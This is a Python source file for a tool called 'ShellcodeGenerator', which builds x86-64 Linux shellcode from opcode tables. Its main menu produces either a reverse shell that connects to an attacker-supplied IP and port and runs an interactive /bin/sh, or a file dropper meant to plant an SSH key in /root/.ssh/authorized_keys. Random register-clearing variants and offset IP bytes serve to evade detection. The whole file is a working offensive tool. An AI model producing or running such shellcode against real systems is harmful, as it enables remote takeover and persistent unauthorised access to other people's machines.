# Author : Joakim PETTESEN <jo.pettersen@proton.me> 
# Author : Léo PEROCHON <leo78@orange.fr>

# IMPORTS

import socket
import os
from sys import argv
from random import randrange


# CONSTANTS

# Syscalls
SYS_WRITE = r"\x01"
SYS_OPEN = r"\x02"
SYS_SOCKET = r"\x29"
SYS_CONNECT = r"\x2b" # 2a + 1
SYS_DUP2 = r"\x21"
SYS_EXECVE = r"\x3b"
SYS_EXIT = r"\x3c"
SYSCALL = r"\x0f\x05"

MOV = {
    "al": r"\xb0",
    "bl": r"\xb3",
    "dl": r"\xb2",
    "si": r"\x66\xbe",
    "dx": r"\x66\xba",
    "esi": r"\xbe",
    "rdi,rbx": r"\x48\x89\xdf",
    "rdi,r10": r"\x4c\x89\xd7",
    "rdi,rsp": r"\x48\x89\xe7",
    "rbx": r"\x48\xbb",
    "rsi,rbx": r"\x48\x89\xde",
    "rsi,rsp": r"\x48\x89\xe6",
    "rdi,rax": r"\x48\x89\xc7",
    "r10,rax": r"\x49\x89\xc2",
    "rdx,rsp": r"\x48\x89\xe2",
    "r9,8bytes": r"\x49\xb9",
    "rsi,rsp": r"\x48\x89\xe6"
}

XOR = {
    "rax,rax": r"\x48\x31\xc0",
    "rbx,rbx": r"\x48\x31\xdb",
    "rcx,rcx": r"\x48\x31\xc9",
    "rdx,rdx": r"\x48\x31\xd2",
    "rsi,rsi": r"\x48\x31\xf6",
    "rdi,rdi": r"\x48\x31\xff"
}

INC = {
    "rsi": r"\x48\xff\xc6"
}

PUSH = {
    "rax": r"\x50",
    "rbx": r"\x53",
    "rcx": r"\x51",
    "rdx": r"\x52",
    "rdi": r"\x57",
    "rsi": r"\x56",
    "r9": r"\x41\x51",
    "port": r"\x66\x68",
    "2": r"\x66\x6a\x02",
    "-i": r"\x66\x68\x2d\x69",
}

SUB = {
    "esi": r"\x81\xee",
    "rax,rax": r"\x48\x29\xc0",
    "rbx,rbx": r"\x48\x29\xdb",
    "rcx,rcx": r"\x48\x29\xc9",
    "rdx,rdx": r"\x48\x29\xd2",
    "rsi,rsi": r"\x48\x29\xf6",
    "rdi,rdi": r"\x48\x29\xff",
    "al": r"\x2c"
}

SHR = {
    "rax,64": r"\x48\xc1\xe8\x40",
    "rbx,64": r"\x48\xc1\xeb\x40",
    "rcx,64": r"\x48\xc1\xe9\x40",
    "rdx,64": r"\x48\xc1\xea\x40",
    "rsi,64": r"\x48\xc1\xee\x40",
    "rdi,64": r"\x48\xc1\xef\x40"
}

SHELL = [
    r"\x2f\x2f\x62\x69\x6e\x2f\x73\x68",    # //bin/sh
    r"\x2f\x62\x69\x6e\x2f\x2f\x73\x68"     # /bin//sh
]


# FUNCTIONS


def chunk(line: str, n: int) -> list[str]:
    return [line[i:i+n] for i in range(0, len(line), n)]


def bytes_to_opcode(buffer: bytes) -> str:
    line = buffer.hex()
    splitted = chunk(line, 2)
    return r"\x" + r"\x".join(splitted)


# Parse IP and return hexa
def gen_ip_in_hex(splited_ip, inc: int):
    new_ip_parts = []
    for part in splited_ip:
        new_part = int(part) + inc
        new_ip_parts.append(str(new_part))
    new_ip_address = ".".join(new_ip_parts)
    var = socket.inet_aton(new_ip_address)
    return bytes_to_opcode(var)


def clean_by_xor(reg: str):
    return XOR[f"{reg},{reg}"]


def clean_by_shr(reg: str):
    return SHR[f"{reg},64"]


def clean_by_sub(reg: str):
    return SUB[f"{reg},{reg}"]


# Hold list of clean functions for random usage
clean_functions = [
    clean_by_xor,
    clean_by_sub,
    clean_by_shr,
]


# CLASS


# Shellcode generator
class Shellcode:
    __code: str = ""

    def __init__(self, code: str = None) -> None:
        if code:
            self.__code = code

    def __str__(self) -> str:
        return self.__code

    # Generator methods

    def clean(self, reg: str, bit_shift: bool = None):
        index_range = 2

        if bit_shift:
            index_range = 3

        rd_index = randrange(index_range)
        self.__code += clean_functions[rd_index](reg)

    def clean_all(self):
        self.clean("rax")
        self.clean("rbx")
        self.clean("rcx")
        self.clean("rdx")
        self.clean("rsi")
        self.clean("rdi")

    def create_socket(self, family: int, socket_type: int):
        family = r"\x" + str(family).zfill(2)  # 2 -> \x02
        socket_type = r"\x" + str(socket_type).zfill(2)

        self.__code += MOV["al"] + SYS_SOCKET
        self.__code += MOV["bl"] + family
        self.__code += MOV["rdi,rbx"]
        self.__code += MOV["bl"] + socket_type
        self.__code += MOV["rsi,rbx"]
        self.__code += SYSCALL

    def connect_socket(self, ip: str, port: int):
        splited_ip = ip.split(".")
        port_hex = socket.htons(port)
        port_hex = port_hex.to_bytes(2, byteorder='little')
        port_hex = ''.join(['\\x{:02x}'.format(b) for b in port_hex])
        
        inc = randrange(5) + 1
        ip_hex = gen_ip_in_hex(splited_ip, inc)
        ip_sub = fr"\x{inc:02x}\x{inc:02x}\x{inc:02x}\x{inc:02x}"

        self.__code += MOV["rdi,rax"]
        self.__code += MOV["r10,rax"]
        self.clean("rax")
        self.__code += MOV["al"] + SYS_CONNECT
        self.__code += SUB["al"] + r"\x01"
        self.clean("rbx")
        self.__code += PUSH["rbx"]

        self.__code += MOV["esi"] + ip_hex
        self.__code += SUB["esi"] + ip_sub

        self.__code += PUSH["rsi"]
        self.__code += PUSH["port"] + port_hex
        self.__code += PUSH["2"]
        
        self.__code += MOV["rsi,rsp"]
        self.__code += MOV["dl"] + r"\x18"
        self.__code += SYSCALL

    def link_io(self):
        # stdin
        self.clean("rax")
        self.clean("rdx")
        self.__code += MOV["al"] + SYS_DUP2
        self.__code += MOV["rdi,r10"]
        self.__code += XOR["rsi,rsi"]
        self.__code += SYSCALL

        # stdout
        self.clean("rax")
        self.clean("rdx")
        self.__code += MOV["al"] + SYS_DUP2
        self.__code += MOV["rdi,r10"]
        self.__code += INC["rsi"]
        self.__code += SYSCALL

        # stderr
        self.clean("rax")
        self.clean("rdx")
        self.__code += MOV["al"] + SYS_DUP2
        self.__code += MOV["rdi,r10"]
        self.__code += INC["rsi"]
        self.__code += SYSCALL

    def exec_bash(self):
        self.clean("rax")
        self.clean("rdx")

        # Gen random between '//bin/sh' and '/bin//sh'
        rd_index = randrange(2)
        #self.__code += MOV["rbx"] + SHELL[rd_index]
        self.__code += MOV["rbx"] + SHELL[1]

        # Filename
        self.__code += PUSH["rax"]
        self.__code += PUSH["rbx"]
        self.__code += MOV["rdi,rsp"]

        # Argv
        self.__code += PUSH["rax"]
        self.__code += PUSH["-i"]
        self.__code += MOV["rdx,rsp"]  # rdx: "-i"
        self.__code += PUSH["rax"]
        self.__code += PUSH["rdx"]
        self.__code += PUSH["rdi"]
        self.__code += MOV["rsi,rsp"]  # rsi: ["//bin/sh", "-i"]

        # Envp
        self.clean("rdx")

        # Execve
        self.__code += MOV["al"] + SYS_EXECVE
        self.__code += SYSCALL

    def exit(self):
        self.clean("rdi")
        self.clean("rax")

        self.__code += MOV["al"] + SYS_EXIT
        self.__code += SYSCALL

    def open(self, file: str):
        file = bytes_to_opcode(file.encode())
        splitted = chunk(file, 32)

        # Aligment
        if len(splitted[-1]) < 32:
            to_fill = int((32 - len(splitted[-1])) / 4)
            file = r"\x2f"*to_fill + file
            splitted = chunk(file, 32)

        splitted.reverse()

        self.clean("rcx")

        # Write filename to stack
        self.__code += PUSH["rcx"]
        for piece in splitted:
            self.__code += MOV["r9,8bytes"] + piece
            self.__code += PUSH["r9"]

        self.__code += MOV["rdi,rsp"]
        self.__code += MOV["al"] + SYS_OPEN
        self.__code += MOV["si"] + r"\x41\x02" # Perm: 0600
        self.__code += MOV["dx"] + r"\x80\x01" # O_CREAT | O_WRONLY | O_TRUNC
        self.__code += SYSCALL


    def write(self, buffer: str):
        buffer = bytes_to_opcode(buffer.encode())
        splitted = chunk(buffer, 32)

        if len(splitted[-1]) < 32:
            to_fill = int((32 - len(splitted[-1])) / 4)
            buffer = buffer + r"\x10"*to_fill
            splitted = chunk(buffer, 32)
        
        splitted.reverse()

        # Get buffer lenght
        count = len(splitted) * 8
        count = r"\x" + chr(count).encode().hex()        

        self.__code += MOV["rdi,rax"]  # file descriptor
        self.clean("rax")
        self.clean("rcx")
        self.clean("rdx")
        
        # Write buffer to the stack
        self.__code += PUSH["rcx"]
        for piece in splitted:
            self.__code += MOV["r9,8bytes"] + piece
            self.__code += PUSH["r9"]

        self.__code += MOV["rsi,rsp"] # Buffer address
        self.__code += MOV["al"] + SYS_WRITE
        self.__code += MOV["dl"] + count
        self.__code += SYSCALL


# MAIN

def main():

    os.system("clear")
    print("""
    ShellcodeGenerator v1.0

    Select which shellcode to generate :

    1. Reverse shell
    2. File dropper
    """)

    index = input("Enter index (ex: 1) : ")

    match index:
        case "1":
            os.system("clear")
            ip = input("Enter IP to connect (ex: 127.0.0.1) : ")
            port = input("Enter port to connect (ex: 8989) : ")
            
            sc = Shellcode()
            sc.clean_all()
            sc.create_socket(2, 1)
            sc.connect_socket(ip, int(port))
            sc.link_io()
            sc.exec_bash()
            sc.exit()
            
            os.system("clear")
            print(sc)
            exit(0)


        case "2":
            source = input("Enter file to drop on host (ex: ~/.ssh/id_ed25519.pub) : ")
            destination = input("Enter where to drop on target (ex: /root/.ssh/authorized_keys) : ")

            with open(source, "r") as f:
                source_file = f.read()

            sc = Shellcode()
            sc.clean_all()
            sc.open(destination)
            sc.write(source_file)
            sc.exit()

            os.system("clear")
            print(sc)
            exit(0)

        case _:
            print("Error: bad input")
            exit(1)


if __name__ == "__main__":
    main()
